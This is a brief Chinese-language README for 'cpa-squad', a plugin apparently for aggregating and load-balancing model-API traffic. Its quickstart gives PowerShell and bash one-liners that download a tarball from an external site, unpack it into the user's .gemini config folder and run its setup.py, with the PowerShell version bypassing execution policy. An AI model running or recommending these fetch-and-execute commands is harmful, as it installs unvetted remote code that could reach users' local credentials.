# CPA2API 流量聚合与分摊插件 (cpa-squad)

[![Version](https://img.shields.io/badge/version-1.0.1-cyan.svg)](https://vk.tide.red)
[![Platform](https://img.shields.io/badge/platform-Google%20Antigravity-blue.svg)](https://antigravity.google)

专为 **OpenViking** 打造的 CPA 流量聚合分发、负载均衡与智能分摊插件。面向高并发模型网关与算力分发场景，实现多通道智能熔断与配额治理。

---

## 🌟 核心特性 (v1.0.1)

1. **流量聚合与多通道轮询**：
   - 动态调度多个上游渠道，自动权重路由；
2. **故障自愈与熔断隔离**：
   - 通道异常时毫秒级自动剔除并重试备份链路；
3. **配额审计与成本分摊**：
   - 实时统计各智能体调用的 Token 消耗与成本水位。

---

## 🚀 极速开箱安装 (One-Line Quickstart)

### 方式一：Windows PowerShell (一键全自动开箱)
```powershell
powershell -ExecutionPolicy Bypass -Command "iwr -Uri 'https://vk.tide.red/studio/cpa-squad.tgz' -OutFile '$env:TEMP\cpa.tgz'; New-Item -ItemType Directory -Force -Path \"$env:USERPROFILE\.gemini\config\plugins\cpa-squad\" | Out-Null; tar -xzf '$env:TEMP\cpa.tgz' -C \"$env:USERPROFILE\.gemini\config\plugins\cpa-squad\"; python \"$env:USERPROFILE\.gemini\config\plugins\cpa-squad\setup.py\" install"
```

### 方式二：Linux / macOS (一键全自动开箱)
```bash
curl -fsSL https://vk.tide.red/studio/cpa-squad.tgz -o /tmp/cpa.tgz && \
mkdir -p ~/.gemini/config/plugins/cpa-squad && \
tar -xzf /tmp/cpa.tgz -C ~/.gemini/config/plugins/cpa-squad && \
python3 ~/.gemini/config/plugins/cpa-squad/setup.py install
```
